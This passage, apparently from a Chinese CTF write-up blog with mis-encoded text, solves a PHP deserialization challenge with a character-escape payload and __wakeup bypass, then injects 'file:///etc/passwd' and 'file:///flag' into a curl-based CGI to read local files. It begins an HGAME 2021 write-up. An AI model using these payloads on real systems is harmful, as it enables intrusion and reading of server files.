class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// phpç‰ˆæœ¬:5.4.44</span></span><br><span class="line">header(<span class="string">&quot;Content-type: text/html; charset=utf-8&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$hint</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hint = <span class="variable">$hint</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;hint===<span class="string">&quot;hint.php&quot;</span>)</span><br><span class="line">            @<span class="keyword">$this</span>-&gt;hint = base64_encode(file_get_contents(<span class="keyword">$this</span>-&gt;hint)); </span><br><span class="line">        var_dump(<span class="keyword">$this</span>-&gt;hint);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;hint != <span class="string">&quot;â•­(â—ï½€âˆ€Â´â—)â•¯&quot;</span>) &#123; </span><br><span class="line">            <span class="comment">//There&#x27;s a hint in ./hint.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;hint = <span class="string">&quot;â•°(â—â€™â—¡â€™â—)â•®&quot;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="variable">$data</span> = str_replace(chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$tmp</span> = <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="variable">$r</span> = str_replace(<span class="string">&#x27;\0\0\0&#x27;</span>, chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>), <span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$r</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$tmp</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="keyword">new</span> User(<span class="variable">$username</span>, <span class="variable">$password</span>));</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag/is&#x27;</span>,<span class="variable">$a</span>))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;NoNoNo!&quot;</span>);</span><br><span class="line"></span><br><span class="line">unserialize(read(write(<span class="variable">$a</span>)));</span><br></pre></td></tr></table></figure><p>ä¸»è¦çš„è€ƒç‚¹æ˜¯å­—ç¬¦å¤šå˜å­—ç¬¦å°‘çš„ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ï¼Œä»¥åŠ PHP 5.4.4 ä¸‹çš„ CVE-2016-7124 å³ <code>__wakeup()</code> çš„ç»•è¿‡ã€‚äºæ˜¯å†™å‡ºå¦‚ä¸‹ payload æ‹¿åˆ° hintã€‚</p><blockquote><p>Fixed In Version: php 5.6.25, php 7.0.10</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> = str_repeat(<span class="string">&#x27;\0\0\0&#x27;</span>,<span class="number">8</span>);</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&#x27;t&quot;;s:8:&quot;password&quot;;O:4:&quot;evil&quot;:2:&#123;s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">//It will be O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:48:&quot; *  *  *  *  *  *  *  * &quot;;s:8:&quot;password&quot;;s:60:&quot;t&quot;;s:8:&quot;password&quot;;O:4:&quot;evil&quot;:2:&#123;s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;&#125;&#125;&quot;;&#125; when serialized by the program</span></span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389841218491/5440a5f5020440ae151d6f63ebd9e6801ebcbe66.png"></p><p>payload å‘é€ä¹‹åå¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKICRoaW50ID0gImluZGV4LmNnaSI7CiAvLyBZb3UgY2FuJ3Qgc2VlIG1lfgo&#x3D;</span><br></pre></td></tr></table></figure><p>å°†å…¶ base64 è§£ç åå¯å¾—å¦‚ä¸‹ hintã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$hint</span> = <span class="string">&quot;index.cgi&quot;</span>;</span><br><span class="line"> <span class="comment">// You can&#x27;t see me~</span></span><br></pre></td></tr></table></figure><p>å®šå‘åˆ°è¿™ä¸ªè·¯ç”±ï¼Œå‘ç°æ˜¯ä¸€ä¸ªç”± curl å‘èµ·è¯·æ±‚çš„å“åº”ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;args&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Bob&quot;</span></span><br><span class="line">  &#125;, </span><br><span class="line">  <span class="attr">&quot;headers&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>, </span><br><span class="line">    <span class="attr">&quot;Host&quot;</span>: <span class="string">&quot;httpbin.org&quot;</span>, </span><br><span class="line">    <span class="attr">&quot;User-Agent&quot;</span>: <span class="string">&quot;curl/7.64.0&quot;</span>, </span><br><span class="line">    <span class="attr">&quot;X-Amzn-Trace-Id&quot;</span>: <span class="string">&quot;Root=1-602a67c5-2bbcf35059d5a41c03702149&quot;</span></span><br><span class="line">  &#125;, </span><br><span class="line">  <span class="attr">&quot;origin&quot;</span>: <span class="string">&quot;114.67.246.176&quot;</span>, </span><br><span class="line">  <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;http://httpbin.org/get?name=Bob&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ—¶å†æ¬¡å°è¯•å¯ä»¥å‘ç°å‚æ•° name å¯æ§ï¼Œäºæ˜¯å°è¯•åœ¨å…¶ä¸­æ‹¼æ¥ä¸€äº› curl çš„å‚æ•°æŒ‡ä»¤ã€‚åœ¨ name å‚æ•°åé¢æ‹¼æ¥ <code> file:///etc/passwd</code> å¯ä»¥å‘ç°å¦‚ä¸‹å›æ˜¾ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;args&quot;: &#123;</span><br><span class="line">    &quot;name&quot;: &quot;lemon&quot;</span><br><span class="line">  &#125;, </span><br><span class="line">  &quot;headers&quot;: &#123;</span><br><span class="line">    &quot;Accept&quot;: &quot;*&#x2F;*&quot;, </span><br><span class="line">    &quot;Host&quot;: &quot;httpbin.org&quot;, </span><br><span class="line">    &quot;User-Agent&quot;: &quot;curl&#x2F;7.64.0&quot;, </span><br><span class="line">    &quot;X-Amzn-Trace-Id&quot;: &quot;Root&#x3D;1-602a6a25-31c02675388dc74e545082fa&quot;</span><br><span class="line">  &#125;, </span><br><span class="line">  &quot;origin&quot;: &quot;114.67.246.176&quot;, </span><br><span class="line">  &quot;url&quot;: &quot;http:&#x2F;&#x2F;httpbin.org&#x2F;get?name&#x3D;lemon&quot;</span><br><span class="line">&#125;</span><br><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br></pre></td></tr></table></figure><p>äºæ˜¯æ„é€ å‡º <code>file:///flag</code>ï¼ŒæˆåŠŸå¾—åˆ°äº† flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b07006f7bdb7be77f633298e0e1829f5&#125;</span><br></pre></td></tr></table></figure><p>åŒæ—¶é™„ä¸Šè¿™é¢˜ <code>index.cgi</code> çš„æºç ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#index.cgi </span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> ./_dep/web.cgi</span><br><span class="line">echo_headers</span><br><span class="line"></span><br><span class="line">name=<span class="variable">$&#123;_GET[&quot;name&quot;]&#125;</span></span><br><span class="line"></span><br><span class="line">[[ <span class="variable">$name</span> == <span class="string">&quot;&quot;</span> ]] &amp;&amp; name=<span class="string">&#x27;Bob&#x27;</span></span><br><span class="line"></span><br><span class="line">curl -v http://httpbin.org/get?name=<span class="variable">$name</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#./_dep/web.cgi</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">WEBASH_VERSION=<span class="string">&#x27;0.1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Some notes:</span></span><br><span class="line"><span class="comment"># - The aim is to use native bash as much as possible</span></span><br><span class="line"><span class="comment"># - printf is more secure than echo because you can&#x27;t tell echo to stop processing parameters</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Make bash intolerant of errors</span></span><br><span class="line"><span class="comment"># set -ef -o pipefail</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">url_decode</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> data=<span class="string">&quot;<span class="variable">$&#123;*//+/ &#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&#x27;%b&#x27;</span> <span class="string">&quot;<span class="variable">$&#123;data//%/\\x&#125;</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">url_encode</span></span>() &#123;</span><br><span class="line">    <span class="comment"># Modified from https://gist.github.com/cdown/1163649</span></span><br><span class="line">    old_lc_collate=<span class="string">&quot;<span class="variable">$LC_COLLATE</span>&quot;</span></span><br><span class="line">    LC_COLLATE=<span class="string">&quot;C&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">local</span> length=<span class="string">&quot;<span class="variable">$&#123;#1&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">for</span> (( pos = 0; pos &lt; length; pos++ )); <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">local</span> chr=<span class="string">&quot;<span class="variable">$&#123;1:pos:1&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;<span class="variable">$chr</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">            <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">                <span class="built_in">printf</span> <span class="string">&#x27;+&#x27;</span></span><br><span class="line">                ;;</span><br><span class="line">            [a-zA-Z0-9.~_-])</span><br><span class="line">                <span class="built_in">printf</span> <span class="string">&quot;%s&quot;</span> <span class="string">&quot;<span class="variable">$chr</span>&quot;</span></span><br><span class="line">                ;;</span><br><span class="line">            *)</span><br><span class="line">                <span class="built_in">printf</span> <span class="string">&#x27;%%%02X&#x27;</span> <span class="string">&quot;&#x27;<span class="variable">$chr</span>&quot;</span></span><br><span class="line">                ;;</span><br><span class="line">        <span class="keyword">esac</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    </span><br><span class="line">    LC_COLLATE=<span class="string">&quot;<span class="variable">$old_lc_collate</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">html</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> str=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">    str=<span class="string">&quot;<span class="variable">$&#123;str//&lt;/&amp;lt;&#125;</span>&quot;</span></span><br><span class="line">    str=<span class="string">&quot;<span class="variable">$&#123;str//&gt;/&amp;gt;&#125;</span>&quot;</span></span><br><span class="line">    str=<span class="string">&quot;<span class="variable">$&#123;str//\&quot;/&amp;quot;&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;%s&quot;</span> <span class="string">&quot;<span class="variable">$str</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http_status_code=<span class="string">&quot;200 OK&quot;</span></span><br><span class="line"><span class="function"><span class="title">http_status</span></span>() &#123;</span><br><span class="line">    http_status_code=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">declare</span> -A http_headers</span><br><span class="line"><span class="function"><span class="title">http_header</span></span>() &#123;</span><br><span class="line">    http_headers[<span class="string">&quot;<span class="variable">$1</span>&quot;</span>]=<span class="string">&quot;<span class="variable">$2</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">echo_headers</span></span>() &#123;</span><br><span class="line">    http_header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;text/html;charset=utf-8&quot;</span></span><br><span class="line">    http_header <span class="string">&quot;X-Server&quot;</span> <span class="string">&quot;webash/<span class="variable">$WEBASH_VERSION</span>&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Output headers</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;Status: %s\r\n&quot;</span> <span class="string">&quot;<span class="variable">$http_status_code</span>&quot;</span></span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;!http_headers[@]&#125;</span>&quot;</span>; <span class="keyword">do</span> </span><br><span class="line">        <span class="built_in">printf</span> <span class="string">&quot;%s: %s\r\n&quot;</span> <span class="string">&quot;<span class="variable">$name</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;http_headers[$name]&#125;</span>&quot;</span>; </span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">http_error</span></span>() &#123;</span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;Status: 500 Internal Server Error\r\n\r\nInternal Server Error&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Parse the query into $_GET</span></span><br><span class="line">IFS=<span class="string">&#x27;&amp;;&#x27;</span> <span class="built_in">read</span> -a query &lt;&lt;&lt; <span class="string">&quot;<span class="variable">$QUERY_STRING</span>&quot;</span></span><br><span class="line"><span class="built_in">declare</span> -A _GET</span><br><span class="line"><span class="keyword">for</span> name_value_str <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;query[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">    IFS=<span class="string">&#x27;=&#x27;</span> <span class="built_in">read</span> -a name_value &lt;&lt;&lt; <span class="string">&quot;<span class="variable">$name_value_str</span>&quot;</span></span><br><span class="line">    name=<span class="string">&quot;<span class="subst">$(url_decode <span class="string">&quot;<span class="variable">$&#123;name_value[0]&#125;</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">    value=<span class="string">&quot;<span class="subst">$(url_decode <span class="string">&quot;<span class="variable">$&#123;name_value[1]&#125;</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">    _GET[<span class="string">&quot;<span class="variable">$name</span>&quot;</span>]=<span class="string">&quot;<span class="variable">$value</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Parse the POST into $_POST</span></span><br><span class="line">IFS=<span class="string">&#x27;&amp;;&#x27;</span> <span class="built_in">read</span> -a query</span><br><span class="line"><span class="built_in">declare</span> -A _POST</span><br><span class="line"><span class="keyword">for</span> name_value_str <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;query[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">    IFS=<span class="string">&#x27;=&#x27;</span> <span class="built_in">read</span> -a name_value &lt;&lt;&lt; <span class="string">&quot;<span class="variable">$name_value_str</span>&quot;</span></span><br><span class="line">    name=<span class="string">&quot;<span class="subst">$(url_decode <span class="string">&quot;<span class="variable">$&#123;name_value[0]&#125;</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">    value=<span class="string">&quot;<span class="subst">$(url_decode <span class="string">&quot;<span class="variable">$&#123;name_value[1]&#125;</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">    _POST[<span class="string">&quot;<span class="variable">$name</span>&quot;</span>]=<span class="string">&quot;<span class="variable">$value</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HGAME 2021</title>
      <link href="/zh-CN/posts/484ca20c.html"/>
      <url>/zh-CN/posts/484ca20c.html</url>
      
        <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Hitchhiking-in-the-Galaxy"><a href="#Hitchhiking-in-the-Galaxy" class="headerlink" title="Hitchhiking_in_the_Galaxy"></a>Hitchhiking_in_the_Galaxy</h3><p>index.php å†…è®¿é—® HitchhikerGuide.php å¯è§ 302 è·³è½¬ï¼Œä½¿ç”¨ BurpSuite GET ä¸€æ¬¡å¯ä»¥å‘ç°è¿”å›å€¼æ˜¯ 405ã€‚äºæ˜¯å°è¯•ä½¿ç”¨ POST è®¿é—®ï¼Œå¾—åˆ°äº†æç¤ºã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åªæœ‰ä½¿ç”¨&quot;æ— é™éæ¦‚ç‡å¼•æ“&quot;(Infinite Improbability Drive)æ‰èƒ½è®¿é—®è¿™é‡Œï½</span><br></pre></td></tr></table></figure><p>æ ¹æ®æç¤ºè®¾ç½®ä¸åŒè¯·æ±‚å¤´æœ€ç»ˆå¯å¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397284391566/58032d58806ed0125c5d55b67be68b8e13b06f7e.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;s3Cret_0f_HitCHhiking_in_the_GAl@xy_i5_dOnT_p@nic!&#125;</span><br></pre></td></tr></table></figure><h3 id="watermelon"><a href="#watermelon" class="headerlink" title="watermelon"></a>watermelon</h3><p>ç¨å¾®ä¿®æ”¹ä¸€ä¸‹ <code>Math.random = function()&#123;return 0.5;&#125;</code> ä½¿å¾—æ‰€æœ‰æ°´æœéƒ½æ˜¯æ©™å­ï¼ŒåŒæ—¶æŠŠå±å¹•è°ƒçª„ã€‚ç©åˆ° 2000 åˆ†ä¹‹åå†æŠŠè¿”å›å€¼è®¾å®šä¸º 1.8 ä½¿æ°´æœå˜ä¸ºåŠä¸ªè¥¿ç“œä»è€Œå¿«é€Ÿå¡«å……å±å¹•è¾“æ‰è¿™å±€æ¯”èµ›ã€‚å¦‚æ­¤å³å¯æ‹¿åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397285255369/36fcffeea8fe03cdcb507790be3dc6e395c8d429.png"></p><h4 id="ä»£ç å®¡è®¡æ³•"><a href="#ä»£ç å®¡è®¡æ³•" class="headerlink" title="ä»£ç å®¡è®¡æ³•"></a>ä»£ç å®¡è®¡æ³•</h4><p>åˆæˆå¤§è¥¿ç“œæ˜¯ä½¿ç”¨ cocos å¼•æ“å¼€å‘çš„æ¸¸æˆï¼Œé‚£ä¹ˆå…¶æ ¸å¿ƒéƒ¨åˆ†ä¸€å®šåœ¨ <code>.../src/project.js</code>ã€‚æ¸¸æˆåœ¨ç»“æŸåä¼šæ”¾å‡º flagï¼Œå› æ­¤æœç´¢å‡º gameover çš„éƒ¨åˆ†ï¼Œå¯ä»¥å‘ç°å¦‚ä¸‹é€»è¾‘ã€‚</p><p><img 